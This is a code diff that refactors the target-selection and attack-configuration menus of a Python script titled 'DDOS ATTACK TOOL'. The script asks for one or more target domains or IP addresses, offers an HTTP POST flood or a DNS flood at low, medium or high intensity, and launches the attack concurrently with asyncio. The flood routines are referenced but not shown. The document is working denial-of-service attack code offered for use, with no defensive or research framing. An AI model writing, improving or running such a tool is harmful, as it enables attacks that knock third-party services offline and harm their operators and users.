@@ -84,85 +84,64 @@ async def main_async(targets, delay, attack_type):
             tasks.append(concurrency_control(send_dns_flood(target, delay), semaphore))
     await asyncio.gather(*tasks)
 
-if __name__ == "__main__":
-    print("\t -- DDOS ATTACK TOOL -- \n")
+def configure_targets():
+    """Common menu for configuring single or multiple targets."""
     multiple = input("Enter 'y' for multiple targets or 'n' for a single target: ").strip().lower()
+    targets = []
 
     if multiple == 'y':
-        targets = []
         t_users = int(input("Enter the total number of targets: "))
         for i in range(t_users):
             target = input(f"Enter the target domain or IP address for target {i + 1}: ").strip()
             if verify_target(target):
                 targets.append(target)
-
-        if targets:
-            print("Select Attack Type:")
-            print("1. HTTP POST Flood")
-            print("2. DNS Flood")
-            attack_type = int(input("Choose attack type (1/2): "))
-
-            print("Select Intensity:")
-            print("1. Low Intensity (1 request every 1 second)")
-            print("2. Medium Intensity (1 request every 0.5 seconds)")
-            print("3. High Intensity (1 request every 0.2 seconds)")
-            mode = int(input("Choose mode (1/2/3): "))
-
-            if mode == 1:
-                delay = 1.0
-            elif mode == 2:
-                delay = 0.5
-            elif mode == 3:
-                delay = 0.2
-            else:
-                print("Invalid choice. Defaulting to High Intensity.")
-                delay = 0.2
-
-            if attack_type == 1:
-                attack = "http_post"
-            elif attack_type == 2:
-                attack = "dns_flood"
-            else:
-                print("Invalid attack type. Exiting...")
-                exit()
-
-            print("Starting attack on multiple targets...")
-            asyncio.run(main_async(targets, delay, attack))
-        else:
-            print("No valid targets to attack.")
     else:
         target = input("Enter the domain or IP address: ").strip()
         if verify_target(target):
-            print("Select Attack Type:")
-            print("1. HTTP POST Flood")
-            print("2. DNS Flood")
-            attack_type = int(input("Choose attack type (1/2): "))
+            targets.append(target)
 
-            print("Select Intensity:")
-            print("1. Low Intensity (1 request every 1 second)")
-            print("2. Medium Intensity (1 request every 0.5 seconds)")
-            print("3. High Intensity (1 request every 0.2 seconds)")
-            mode = int(input("Choose mode (1/2/3): "))
+    return targets
 
-            if mode == 1:
-                delay = 1.0
-            elif mode == 2:
-                delay = 0.5
-            elif mode == 3:
-                delay = 0.2
-            else:
-                print("Invalid choice. Defaulting to High Intensity.")
-                delay = 0.2
+def configure_attack():
+    """Menu for selecting attack type and intensity."""
+    print("Select Attack Type:")
+    print("1. HTTP POST Flood")
+    print("2. DNS Flood")
+    attack_type = int(input("Choose attack type (1/2): "))
 
-            if attack_type == 1:
-                attack = "http_post"
-            elif attack_type == 2:
-                attack = "dns_flood"
-            else:
-                print("Invalid attack type. Exiting...")
-                exit()
+    print("Select Intensity:")
+    print("1. Low Intensity (1 request every 1 second)")
+    print("2. Medium Intensity (1 request every 0.5 seconds)")
+    print("3. High Intensity (1 request every 0.2 seconds)")
+    mode = int(input("Choose mode (1/2/3): "))
 
-            print("Starting attack on single target...")
-            asyncio.run(main_async([target], delay, attack))
-        else:
-            print("Target is not reachable. Exiting...")
+    if mode == 1:
+        delay = 1.0
+    elif mode == 2:
+        delay = 0.5
+    elif mode == 3:
+        delay = 0.2
+    else:
+        print("Invalid choice. Defaulting to High Intensity.")
+        delay = 0.2
+
+    if attack_type == 1:
+        attack = "http_post"
+    elif attack_type == 2:
+        attack = "dns_flood"
+    else:
+        print("Invalid attack type. Exiting...")
+        exit()
+
+    return attack, delay
+
+if __name__ == "__main__":
+    print("\t -- DDOS ATTACK TOOL -- \n")
+    targets = configure_targets()
+
+    if targets:
+        attack, delay = configure_attack()
+        print("Starting attack...")
+        asyncio.run(main_async(targets, delay, attack))
+    else:
+        print("No valid targets to attack.")
